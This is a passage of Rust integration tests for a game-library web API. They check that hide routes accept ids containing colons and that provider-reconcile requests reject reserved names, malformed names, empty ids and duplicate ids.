            && sc["enabled"].is_boolean()),
        "every source row must carry the shape the console renders: {json}"
    );
    // `custom` is a store, never a source — the toggle surface must not offer it.
    assert!(scanners.iter().all(|sc| sc["id"] != "custom"));

    let (s, json) = send(
        &app,
        axum::http::Request::put("/api/v1/library/scanners/not-a-store")
            .header(axum::http::header::CONTENT_TYPE, "application/json")
            .body(Body::from(
                serde_json::json!({"enabled": false}).to_string(),
            ))
            .unwrap(),
    )
    .await;
    assert_eq!(
        s,
        StatusCode::NOT_FOUND,
        "unknown source id must 404: {json}"
    );
}

/// A library id is `<store>:<external_id>`, so the hide route's path segment CONTAINS A COLON —
/// and for Heroic (`heroic:legendary:<hash>`) it contains two.
///
/// This is the one thing about the endpoint that could be silently wrong: if the router did not
/// match, or split on the colon, the console's hide button would 404 against an id the host itself
/// produced. Asserting "not 404" is the whole point, so the body is deliberately INVALID — that
/// stops at the JSON layer with a 4xx and never reaches the handler, which would otherwise write
/// `library-hidden.json` into the developer's real config dir (the same reason the toggle test
/// above only exercises its rejection path).
#[tokio::test]
async fn hide_route_matches_ids_containing_colons() {
    let app = test_app(test_state(), None);
    let put = |id: &str| {
        axum::http::Request::put(format!("/api/v1/library/hidden/{id}"))
            .header(axum::http::header::CONTENT_TYPE, "application/json")
            // Not a `HiddenToggle` — rejected before the handler runs.
            .body(Body::from(serde_json::json!({"nope": 1}).to_string()))
            .unwrap()
    };

    for id in ["steam:70", "custom:abc", "heroic:legendary:fc0b13b7"] {
        let (s, json) = send(&app, put(id)).await;
        assert_ne!(
            s,
            StatusCode::NOT_FOUND,
            "`{id}` must ROUTE — a colon is a legal path character and every library id has one: {json}"
        );
        assert!(
            s.is_client_error(),
            "a body that is not a HiddenToggle must be refused, not accepted: {s} {json}"
        );
    }
}

// ------------------------------------------------------------------ library providers

/// Provider reconcile validation (the write path itself is unit-tested in `library::custom`
/// against pure functions — a successful PUT here would touch the developer's real catalog).
#[tokio::test]
async fn provider_reconcile_validation() {
    let app = test_app(test_state(), None);
    let put = |provider: &str, body: serde_json::Value| {
        axum::http::Request::put(format!("/api/v1/library/provider/{provider}"))
            .header(axum::http::header::CONTENT_TYPE, "application/json")
            .body(Body::from(body.to_string()))
            .unwrap()
    };

    // Reserved / malformed provider ids.
    let (s, json) = send(&app, put("manual", serde_json::json!([]))).await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    assert!(json["error"].as_str().unwrap().contains("reserved"));
    let (s, _) = send(&app, put("Bad%2FName", serde_json::json!([]))).await;
    assert_eq!(s, StatusCode::BAD_REQUEST);

    // Payload rules: empty external_id, duplicate external_id.
    let (s, _) = send(
        &app,
        put(
            "romm",
            serde_json::json!([{"external_id": "", "title": "X"}]),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    let (s, json) = send(
        &app,
        put(
            "romm",
            serde_json::json!([
                {"external_id": "a", "title": "A"},
                {"external_id": "a", "title": "B"}
            ]),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    assert!(json["error"].as_str().unwrap().contains("duplicate"));

    // DELETE validates the name too.
    let del = axum::http::Request::delete("/api/v1/library/provider/manual")
        .body(Body::empty())
        .unwrap();
    let (s, _) = send(&app, del).await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
}
